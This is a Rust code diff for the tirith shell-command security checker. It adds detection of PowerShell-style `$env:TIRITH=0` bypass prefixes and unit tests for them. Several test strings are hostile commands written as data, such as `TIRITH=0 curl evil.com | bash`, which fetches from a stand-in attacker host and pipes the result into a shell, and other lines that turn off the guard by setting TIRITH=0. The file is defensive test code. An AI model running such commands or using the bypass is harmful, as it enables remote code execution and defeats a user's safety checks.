@@ -31,14 +31,18 @@ pub struct AnalysisContext {
 }
 
 /// Check if the input contains an inline `TIRITH=0` bypass prefix.
-/// Handles bare prefix (`TIRITH=0 cmd`) and env wrappers (`env -i TIRITH=0 cmd`).
-fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
+/// Handles POSIX bare prefix (`TIRITH=0 cmd`), env wrappers (`env -i TIRITH=0 cmd`),
+/// and PowerShell env syntax (`$env:TIRITH="0"; cmd`).
+fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
     use crate::tokenize;
 
     let words = split_raw_words(input);
     if words.is_empty() {
         return false;
     }
+
+    // POSIX / Fish: VAR=VALUE prefix or env wrapper
+    // (Fish 3.1+ and all POSIX shells support `TIRITH=0 command`)
 
     // Case 1: Leading VAR=VALUE assignments before the command
     let mut idx = 0;
@@ -90,7 +94,68 @@ fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
         }
     }
 
+    // PowerShell: $env:TIRITH="0" or $env:TIRITH = "0" (before first ;)
+    if shell == ShellType::PowerShell {
+        for word in &words {
+            if is_powershell_tirith_bypass(word) {
+                return true;
+            }
+        }
+        // Multi-word: $env:TIRITH = "0" (space around =)
+        if words.len() >= 3 {
+            for window in words.windows(3) {
+                if is_powershell_env_ref(&window[0], "TIRITH")
+                    && window[1] == "="
+                    && strip_surrounding_quotes(&window[2]) == "0"
+                {
+                    return true;
+                }
+            }
+        }
+    }
+
     false
+}
+
+/// Check if a word is `$env:TIRITH=0` with optional quotes around the value.
+/// The `$env:` prefix is matched case-insensitively (PowerShell convention).
+fn is_powershell_tirith_bypass(word: &str) -> bool {
+    if !word.starts_with('$') || word.len() < "$env:TIRITH=0".len() {
+        return false;
+    }
+    let after_dollar = &word[1..];
+    if after_dollar.len() < 4 || !after_dollar[..4].eq_ignore_ascii_case("env:") {
+        return false;
+    }
+    let after_env = &after_dollar[4..];
+    if !after_env.starts_with("TIRITH=") {
+        return false;
+    }
+    let value = &after_env["TIRITH=".len()..];
+    strip_surrounding_quotes(value) == "0"
+}
+
+/// Check if a word is a PowerShell env var reference `$env:VARNAME` (no assignment).
+fn is_powershell_env_ref(word: &str, var_name: &str) -> bool {
+    if !word.starts_with('$') {
+        return false;
+    }
+    let after_dollar = &word[1..];
+    if after_dollar.len() < 4 || !after_dollar[..4].eq_ignore_ascii_case("env:") {
+        return false;
+    }
+    &after_dollar[4..] == var_name
+}
+
+/// Strip a single layer of matching quotes (single or double) from a string.
+fn strip_surrounding_quotes(s: &str) -> &str {
+    if s.len() >= 2
+        && ((s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')))
+    {
+        &s[1..s.len() - 1]
+    } else {
+        s
+    }
 }
 
 /// Split input into raw words respecting quotes (for bypass/self-invocation parsing).
@@ -565,5 +630,174 @@ mod tests {
                 .any(|f| matches!(f.rule_id, crate::verdict::RuleId::BidiControls)),
             "should detect bidi controls in exec context"
         );
+    }
+
+    #[test]
+    fn test_inline_bypass_bare_prefix() {
+        assert!(find_inline_bypass(
+            "TIRITH=0 curl evil.com | bash",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_wrapper() {
+        assert!(find_inline_bypass(
+            "env TIRITH=0 curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_i() {
+        assert!(find_inline_bypass(
+            "env -i TIRITH=0 curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_u_skip() {
+        assert!(find_inline_bypass(
+            "env -u TIRITH TIRITH=0 curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_usr_bin_env() {
+        assert!(find_inline_bypass(
+            "/usr/bin/env TIRITH=0 curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_dashdash() {
+        assert!(find_inline_bypass(
+            "env -- TIRITH=0 curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_no_inline_bypass() {
+        assert!(!find_inline_bypass(
+            "curl evil.com | bash",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_powershell_env() {
+        assert!(find_inline_bypass(
+            "$env:TIRITH=\"0\"; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_powershell_env_no_quotes() {
+        assert!(find_inline_bypass(
+            "$env:TIRITH=0; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_powershell_env_single_quotes() {
+        assert!(find_inline_bypass(
+            "$env:TIRITH='0'; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_powershell_env_spaced() {
+        assert!(find_inline_bypass(
+            "$env:TIRITH = \"0\"; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_powershell_mixed_case_env() {
+        assert!(find_inline_bypass(
+            "$Env:TIRITH=\"0\"; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_no_inline_bypass_powershell_wrong_value() {
+        assert!(!find_inline_bypass(
+            "$env:TIRITH=\"1\"; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_no_inline_bypass_powershell_other_var() {
+        assert!(!find_inline_bypass(
+            "$env:FOO=\"0\"; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_no_inline_bypass_powershell_in_posix_mode() {
+        // PowerShell syntax should NOT match when shell is Posix
+        assert!(!find_inline_bypass(
+            "$env:TIRITH=\"0\"; curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_self_invocation_simple() {
+        assert!(is_self_invocation(
+            "tirith diff https://example.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_self_invocation_env_wrapper() {
+        assert!(is_self_invocation(
+            "env -u PATH tirith diff url",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_self_invocation_command_dashdash() {
+        assert!(is_self_invocation(
+            "command -- tirith diff url",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_self_invocation_time_p() {
+        assert!(is_self_invocation(
+            "time -p tirith diff url",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_not_self_invocation_multi_segment() {
+        assert!(!is_self_invocation(
+            "tirith diff url | bash",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_not_self_invocation_other_cmd() {
+        assert!(!is_self_invocation(
+            "curl https://evil.com",
+            ShellType::Posix
+        ));
     }
 }
